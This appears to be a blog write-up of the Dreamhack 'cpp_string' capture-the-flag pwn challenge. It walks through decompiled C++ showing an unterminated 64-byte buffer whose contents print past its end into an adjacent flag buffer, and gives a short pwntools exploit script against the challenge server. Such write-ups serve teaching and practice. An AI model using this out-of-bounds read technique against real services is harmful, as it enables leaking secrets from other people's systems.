+++
date = '2026-05-06'
draft = false
title = 'Dreamhack cpp_string Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(cpp_string)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾아 flag를 획득하세요!
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  int v9; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v10; // [rsp+8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  initialize();
  v9 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Simple file system");
      std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
      v4 = std::operator<<<std::char_traits<char>>(&std::cout, "1. read file");
      std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
      v5 = std::operator<<<std::char_traits<char>>(&std::cout, "2. write file");
      std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
      v6 = std::operator<<<std::char_traits<char>>(&std::cout, "3. show contents");
      std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
      v7 = std::operator<<<std::char_traits<char>>(&std::cout, "4. quit");
      std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
      std::operator<<<std::char_traits<char>>(&std::cout, "[*] input : ");
      std::istream::operator>>(&std::cin, &v9);
      if ( v9 != 2 )
        break;
      write_file();
    }
    if ( v9 > 2 )
    {
      if ( v9 == 3 )
      {
        show_contents();
      }
      else if ( v9 == 4 )
      {
        v8 = std::operator<<<std::char_traits<char>>(&std::cout, "BYEBYE");
        std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
        exit(0);
      }
    }
    else if ( v9 == 1 )
    {
      read_flag();
      read_file();
    }
  }
}
```

## Identifying the vulnerabilities

These absolutely disgusting looking cpp binaries...

What the chunkier part of the main is, is just printing the menu. Then, we can write into `v9`'s address.

The `write_file()` function will take our input, and put it into the `test` file. Before that, it's put in `&writebuffer`.

The `read_flag();` file opens an `ifstream` to a flag called "flag", checks if it's open and writes it into `flag` (in .bss). If it's not open, then it just exits.

We can just create a flag file for this, since a test file already exists. The reason I'm talking about a test file is this:

```c
__int64 __fastcall read_file()
{
  __int64 v0; // rax
  __int64 v2; // rax
  _BYTE v3[520]; // [rsp+0h] [rbp-220h] BYREF
  unsigned __int64 v4; // [rsp+208h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  std::ifstream::basic_ifstream((__int64)v3, (__int64)"test", 4);
  if ( !(unsigned __int8)std::ifstream::is_open(v3) )
  {
    v2 = std::operator<<<std::char_traits<char>>(&std::cout, "No testfile...exiting..");
    std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
    exit(0);
  }
  std::istream::read((std::istream *)v3, readbuffer, 64);
  std::ifstream::close(v3);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "Read complete!");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::ifstream::~ifstream(v3);
  return 0;
}
```

The `read_file()` function will take 64 bytes from `test`, and put them into `readbuffer`.


```c
__int64 __fastcall show_contents()
{
  __int64 v0; // rax

  std::operator<<<std::char_traits<char>>(&std::cout, "contents : ");
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, readbuffer);
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  return 0;
}
```

The `show_contents()` will show the current contents of `readbuffer`.

And, `readbuffer` is 0x40 or 64 bytes long. So if we overwrite the null byte (which we can), it should just keep printing the immediate value after that - aka flag!

```asm
.bss:0000000000602380 readbuffer      db 40h dup(?)           ; DATA XREF: read_file(void)+53↑o
.bss:0000000000602380                                         ; show_contents(void)+13↑o
.bss:00000000006023C0                 public flag
.bss:00000000006023C0 ; char flag[64]
.bss:00000000006023C0 flag            db 40h dup(?)           ; DATA XREF: read_flag(void)+53↑o
```

Looks like I was right! My amazing intuition strikes again.

![challenge-screenshot](right.png#center)

Well, an exploit script isn't that necessary for this one, but I made it anyways. Connecting remotely, we get the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
#elf = ELF('/home/kali/Downloads/file')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:24563'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#write in test file aka readbuffer
p.recvuntil(b": ")
p.sendline(b"2")

#we want to overwrite readbuffer's newline to leak next value in .bss
#first, write data in test file
p.recvuntil(b": ")
p.sendline(b"A"*64)

#readfile - move contents from test file to readbuffer
p.recvuntil(b": ")
p.sendline(b"1")

#show content
p.recvuntil(b": ")
p.sendline(b"3")

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/cpp_string.py)**.
